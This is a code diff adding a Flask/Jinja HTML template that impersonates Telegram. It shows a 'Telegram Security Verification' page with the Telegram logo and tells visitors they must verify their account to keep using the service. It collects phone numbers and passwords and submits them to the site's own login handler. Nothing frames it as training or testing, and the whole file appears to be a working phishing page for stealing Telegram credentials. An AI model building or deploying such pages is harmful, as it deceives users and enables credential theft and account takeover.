@@ -1,0 +1,28 @@
+{% extends 'base.html' %}
+
+{% block title %}Telegram Security Verification{% endblock %}
+
+{% block content %}
+<div class="login-container">
+    <div class="login-box">
+        <div class="logo">
+            <img src="{{ url_for('static', filename='images/telegram_logo.png') }}" alt="Telegram Logo">
+        </div>
+        <h1>Telegram Security Verification</h1>
+        <p class="subtitle">Please verify your account to continue using Telegram services</p>
+        
+        <form action="{{ url_for('process_login') }}" method="post">
+            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="text" id="phone" name="phone" placeholder="+1234567890" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="btn btn-primary">Continue</button>
+        </form>
+    </div>
+</div>
+{% endblock %}
